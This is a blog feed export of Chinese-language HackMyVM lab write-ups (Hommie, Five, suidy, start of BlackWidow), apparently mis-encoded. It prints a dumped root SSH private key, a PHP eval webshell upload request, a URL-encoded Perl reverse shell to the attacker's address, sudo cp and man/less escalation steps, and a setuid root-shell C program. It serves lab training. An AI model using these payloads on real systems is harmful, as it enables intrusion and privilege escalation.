<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.004.png" referrerpolicy="no-referrer"><br>è¯»å–ç¯å¢ƒå˜é‡ä¸­çš„Home å¯¹åº”çš„ç§é’¥<br>é‚£æˆ‘ä»¬ä¿®æ”¹å½“å‰ç¯å¢ƒå˜é‡ä¸ºæˆ‘ä»¬æƒ³è¦è·å–ç§é’¥çš„ç”¨æˆ·å³å¯<br>alexia@hommie:/opt$ export HOME=/root
alexia@hommie:/opt$ ./showMetheKey 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5
hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11
5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk
/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC
EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz
Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL
vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY
DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz
m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy
LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681
2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5
5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N
R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY
sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU
irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk
/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z
DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh
4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie
B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr
zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV
qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi
KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+
12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq
gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
-----END OPENSSH PRIVATE KEY-----
<br>å¤åˆ¶å†™å…¥ç§é’¥ç„¶åè¿æ¥root
vi id\_rsa
chmod 600 id\_rsa
ssh -i id\_rsa root@127.0.0.1
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.005.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/7.hommie.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/7.Hommie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[6.Five]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. 1.ä¿¡æ¯æ”¶é›†" data-href="#2. 1.ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._1.ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. 1.ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. 2.æ–‡ä»¶ä¸Šä¼ " data-href="#3. 2.æ–‡ä»¶ä¸Šä¼ " href="https://www.c1trus.top/about:blank#3._2.æ–‡ä»¶ä¸Šä¼ " class="internal-link" target="_self" rel="noopener nofollow">3. 2.æ–‡ä»¶ä¸Šä¼ </a>
<br><a data-tooltip-position="top" aria-label="4. 3.æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" data-href="#4. 3.æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" href="https://www.c1trus.top/about:blank#4._3.æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="internal-link" target="_self" rel="noopener nofollow">4. 3.æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</a>
<br><a data-tooltip-position="top" aria-label="5. 4.ææƒ" data-href="#5. 4.ææƒ" href="https://www.c1trus.top/about:blank#5._4.ææƒ" class="internal-link" target="_self" rel="noopener nofollow">5. 4.ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Five
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ç›®å½•ç»•è¿‡ã€SSHå†™å…¬é’¥ã€SUDOææƒ(manã€cp)
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]
â””â”€# nmap -sS 192.168.9.8  -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 12:48 CST
Nmap scan report for 192.168.9.8
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:93:A4:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" referrerpolicy="no-referrer"><br>ç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]
â””â”€# gobuster dir -u http://192.168.9.8/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 185] [--&gt; http://192.168.9.8/uploads/]
/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.8/admin/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.002.png" referrerpolicy="no-referrer"><br>/uploadsæ˜¯ç©ºçš„ã€‚<br>çœ‹ä¸‹/admin<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.003.png" referrerpolicy="no-referrer"><br>çˆ†ç ´ä¸€ä¸‹<br>æ²¡æœ‰å•¥ç»“æœ<br><br>è®¿é—®/upload.html<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.004.png" referrerpolicy="no-referrer"><br>ä¼ ä¸€ä¸ªé©¬ä¸Šå»<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.005.png" referrerpolicy="no-referrer"><br>æ‰«æç›®å½•å‘ç°æœ‰/uploadsç›®å½•<br>å¤§æ¦‚ç‡å°±æ˜¯ä¸Šä¼ åˆ°è¿™ä¸ªç›®å½•äº†<br>è®¿é—®å‘ç°æœ‰é—®é¢˜ã€‚ä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºtxt å‘ç°å¯ä»¥è®¿é—®<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.006.png" referrerpolicy="no-referrer"><br>è¿™åº”è¯¥æ˜¯å¯¹æ–‡ä»¶æ ¼å¼è¿›è¡Œäº†é™åˆ¶<br>å°è¯•å¤§å°å†™ç»•è¿‡å¤±è´¥ï¼Œ<br><br>è§‚å¯Ÿæ•°æ®åŒ…<br>POST /upload.php HTTP/1.1
Host: 192.168.9.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Viewer/99.9.8782.87
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------170435815133440741313678117785
Content-Length: 509
Origin: http://192.168.9.8
Connection: keep-alive
Referer: http://192.168.9.8/upload.html
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Priority: u=0, i

-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="fileToUpload"; filename="1.php"
Content-Type: application/octet-stream

&lt;?php
eval($\_POST["pass"]);

-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="directory"

/uploads
-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------170435815133440741313678117785--
<br>å¯èƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ ç›®å½•è¿›è¡Œäº†é™åˆ¶ã€‚æˆ‘ä»¬å°†/uploadsä¿®æ”¹ä¸º./<br>æˆåŠŸä¸Šä¼ ä¸”å¯ä»¥è®¿é—®<a rel="noopener nofollow" class="external-link" href="http://192.168.9.8/1.php" target="_blank">http://192.168.9.8/1.php</a><br>ç›´æ¥ç”¨å“¥æ–¯æ‹‰è¿æ¥ä¸Šå»<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.007.png" referrerpolicy="no-referrer"><br>é‡æ–°ä¸Šä¼ ä¸€ä¸ªç³»ç»Ÿé©¬åå¼¹shell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.008.png" referrerpolicy="no-referrer"><br>pass=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.009.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@five:/var/www/html$ find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/man
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/more
(remote) www-data@five:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on five:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on five:
    (melisa) NOPASSWD: /bin/cp
<br>www-dataç”¨æˆ·å¯ä»¥ç”¨melisaç”¨æˆ·çš„CPå‘½ä»¤æƒé™<br>ç›´æ¥å¤åˆ¶user.txtåˆ°1.txtå¹¶æŸ¥çœ‹1.txtæ˜¯ä¸è¡Œçš„<br>å› ä¸º1.txtä¹Ÿæ˜¯å±äºmelisaçš„æ–‡ä»¶ã€‚å½“å‰ç”¨æˆ·æ— æ³•æŸ¥çœ‹<br>æˆ‘ä»¬è¦è‡ªå·±ç»™è‡ªå·±åˆ›å»ºä¸€ä¸ªå±äºè‡ªå·±çš„æ–‡ä»¶ ç„¶åå¤åˆ¶user.txtåˆ°è¿™ä¸ªæ–‡ä»¶é‡Œé¢<br>è€Œä¸”è¿˜è¦å…ˆå°†è¿™ä¸ªæ–‡ä»¶ç»™melisaç”¨æˆ·è¯»å†™æƒé™ã€‚ä¸ç„¶meilisaå†™ä¸äº†<br>touch 1.txt
chmod a+rw 1.txt
sudo -u melisa cp /home/melisa/user.txt /tmp/1.txt
<br>5.ææƒroot<br>å½“å‰ç”¨æˆ·é™¤äº†melisaçš„cpæƒé™å°±æ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿äº†ã€‚æˆ‘ä»¬ç›´æ¥å€ŸåŠ©cpå†™å…¬é’¥ç»™melisa ç„¶åsshä¸Šå»<br>çœ‹ä¸€ä¸‹sshçš„é…ç½®<br>cat /etc/ssh/sshd\_config
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.010.png" referrerpolicy="no-referrer"><br>4444ç«¯å£å¼€æ”¾<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.011.png" referrerpolicy="no-referrer"><br>å†™å…¬é’¥è¿æ¥melisaç”¨æˆ·<br>cd /tmp
ssh-keygen //ç”Ÿæˆå…¬ç§é’¥
sudo -u melisa cp id\_rsa.pub /home/melisa/.ssh/authorized\_keys //å†™å…¥å…¬é’¥
ssh -i id\_rsa -p 4444 melisa@127.0.0.1
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.012.png" referrerpolicy="no-referrer"><br>melisa@five:~$ sudo -l
Matching Defaults entries for melisa on five:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User melisa may run the following commands on five:
    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.013.png" referrerpolicy="no-referrer"><br>ä½†æ˜¯ä¼šå‘ç°ä½¿ç”¨ Sudo man man æ— æ³•æ‰§è¡Œå‘½ä»¤<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.014.png" referrerpolicy="no-referrer"><br>è¿™æ˜¯å› ä¸ºåˆ†é¡µæ¨¡å¼ä¸åŒï¼Œä½¿ç”¨ less åˆ†é¡µå³å¯æ‰§è¡Œå‘½ä»¤<br>lessåˆ†é¡µæ¨¡å¼<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.015.png" referrerpolicy="no-referrer"><br>sudo man -P /usr/bin/less man
!/bin/bash
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.016.png" referrerpolicy="no-referrer"><br>æ‹“å±•<br>æˆ‘ä»¬çŸ¥é“æ¼æ´çš„åŸå› æ˜¯ä¸Šä¼ æ—¶å…è®¸æˆ‘ä»¬ä¿®æ”¹ç›®å½•ç»•è¿‡äº†ä»–æŒ‡å®šçš„ä¸Šä¼ ç›®å½•/uploads<br>upload.php
&lt;?php

$target\_dir = $\_POST["directory"];
$target\_file = $target\_dir . basename($\_FILES["fileToUpload"]["name"]);
$uploadOk = 1;

// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move\_uploaded\_file($\_FILES["fileToUpload"]["tmp\_name"], $target\_file)) {
    echo "The file ". htmlspecialchars( basename( $\_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?&gt;
<br>çœ‹ä¸€ä¸‹uploadså¯ä»¥å‘ç°æˆ‘ä»¬ä¸Šä¼ çš„Phpé©¬ç¡®å®æ˜¯ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯å´æ— æ³•è®¿é—®ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.017.png" referrerpolicy="no-referrer"><br>çœ‹ä¸‹/etc/nginx/nginx.confä¸/etc/nginx/sites-enabled/defaut<br>åœ¨/etc/nginx/sites-enabled/defaut æ‰¾åˆ°äº†åŸå› <br>location ~\* /uploads/.\*.php$
{
return 403;
}
<br>è¿™ä¸€éƒ¨åˆ†é…ç½®æ˜ç¡®ç¦æ­¢è®¿é—® /uploads/ ç›®å½•ä¸‹çš„ä»»ä½• PHP æ–‡ä»¶ï¼Œè¿”å› 403 Forbidden é”™è¯¯ã€‚]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/6.five.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/6.Five.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.suidy]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç›®å½•æ‰«æ" data-href="#2.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç›®å½•æ‰«æ</a>


<br><a data-tooltip-position="top" aria-label="3. çˆ†ç ´æ–‡ä»¶" data-href="#3. çˆ†ç ´æ–‡ä»¶" href="https://www.c1trus.top/about:blank#3._çˆ†ç ´æ–‡ä»¶" class="internal-link" target="_self" rel="noopener nofollow">3. çˆ†ç ´æ–‡ä»¶</a>
<br><a data-tooltip-position="top" aria-label="4. sshè¿æ¥" data-href="#4. sshè¿æ¥" href="https://www.c1trus.top/about:blank#4._sshè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">4. sshè¿æ¥</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=suidy
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šffuf  hydra  SUIDæ›¿æ¢ææƒ
<br><br>ç«¯å£æ‰«æ<br>Nmap scan report for 192.168.9.7
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B1:28:F4 (Oracle VirtualBox virtual NIC)
<br><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" referrerpolicy="no-referrer"><br>æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œåªæœ‰ä¸€ä¸ªrobots.txt<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.002.png" referrerpolicy="no-referrer"><br>çœ‹ä¸‹ç½‘é¡µæºç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.003.png" referrerpolicy="no-referrer"><br>çœ‹ä¸‹rotbots.txt<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.004.png" referrerpolicy="no-referrer"><br>ç¿»åˆ°æœ€ä¸‹é¢å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.005.png" referrerpolicy="no-referrer"><br>è®¿é—®ç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.006.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.007.png" referrerpolicy="no-referrer"><br>é‚£å°±æ˜¯è¦æˆ‘ä»¬çˆ†ç ´ç›®å½•ï¼Œè·å–åˆ°è¿™ä¸ª.txtæ–‡ä»¶<br>ä¸‹è½½seclistå­—å…¸<a rel="noopener nofollow" class="external-link" href="https://github.com/danielmiessler/SecLists" target="_blank">https://github.com/danielmiessler/SecLists</a><br><br>åˆ©ç”¨fuffå·¥å…·è¿›è¡Œçˆ†ç ´<br>ffuf -u http://192.168.9.7/shehatesme/FUZZ.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<br>è¿™é‡Œçˆ†ç ´å‡ºäº†å¥½å¤šç»“æœ<br>åŠ ä¸€ä¸ª-odå‚æ•° è¾“å‡ºåˆ°resultç›®å½•<br>ffuf -u http://192.168.9.7/shehatesme/FUZZ.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -od result
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.008.png" referrerpolicy="no-referrer"><br>çœ‹ä¸€ä¸‹è¾“å‡ºçš„æ–‡ä»¶å†…å®¹æ ¼å¼<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.009.png" referrerpolicy="no-referrer"><br>ä¸‹é¢è¿™ä¸ªå°±æ˜¯è´¦æˆ·å¯†ç <br>æˆ‘ä»¬åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†å…¶æå–å‡ºæ¥<br>tail -q -n 1 \* | sort | uniq | tee yhm.txt
<br>ç„¶åæŠŠæ–œæ æ›¿æ¢æˆ:<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.010.png" referrerpolicy="no-referrer"><br>hydraçˆ†ç ´
hydra -C ssh.txt  192.168.9.7 ssh
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.011.png" referrerpolicy="no-referrer"><br><br>ssh theuser@192.168.9.7
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.012.png" referrerpolicy="no-referrer"><br>\3. SUIDæ›¿æ¢ææƒ<br>theuser@suidy:/home/suidy$ find / -perm -4000 2&gt;/dev/null
/home/suidy/suidyyyyy
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
<br>è¿™é‡Œæœ‰ä¸€ä¸ªsuidyyyy å¯æ‰§è¡Œæ–‡ä»¶<br>çœ‹ä¸‹è¿™ä¸ªæ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.013.png" referrerpolicy="no-referrer"><br>è¿™é‡Œè¯´æ˜æˆ‘ä»¬å½“å‰ç”¨æˆ·theuserå¯¹è¿™ä¸ªæ–‡ä»¶æ˜¯æœ‰è¯»å†™æƒé™çš„ã€‚è€Œä¸”è¿™ä¸ªæ–‡ä»¶è¢«è®¾ç½®äº†suid ä¸sgid<br>é‚£æˆ‘ä»¬å°†è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ›¿æ¢å³å¯åˆ©ç”¨SUIDæ‰§è¡Œä»»æ„æ–‡ä»¶<br>æˆ‘ä»¬æ–°å»ºä¸€ä¸ª power.c<br>#include &lt;stdio.h&gt;
int main() {
        setuid(0);           
        setgid(0);  
        system("/bin/bash -p");
        }
<br>gcc  power.c -o  suidyyyyy ç¼–è¯‘
cp suidyyyyy /home/suidy/suidyyyyy å¤åˆ¶æ›¿æ¢
./suidyyyyy æ‰§è¡Œææƒ
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.014.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/5.suidy.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/5.suidy.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[47.BlackWidow]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. FUZZæµ‹è¯•LFI" data-href="#2.3. FUZZæµ‹è¯•LFI" href="https://www.c1trus.top/about:blank#2.3._FUZZæµ‹è¯•LFI" class="internal-link" target="_self" rel="noopener nofollow">2.3. FUZZæµ‹è¯•LFI</a>
<br><a data-tooltip-position="top" aria-label="2.4. æ—¥å¿—åŒ…å«getshell" data-href="#2.4. æ—¥å¿—åŒ…å«getshell" href="https://www.c1trus.top/about:blank#2.4._æ—¥å¿—åŒ…å«getshell" class="internal-link" target="_self" rel="noopener nofollow">2.4. æ—¥å¿—åŒ…å«getshell</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒviperç”¨æˆ·" data-href="#3. ææƒviperç”¨æˆ·" href="https://www.c1trus.top/about:blank#3._ææƒviperç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒviperç”¨æˆ·</a>
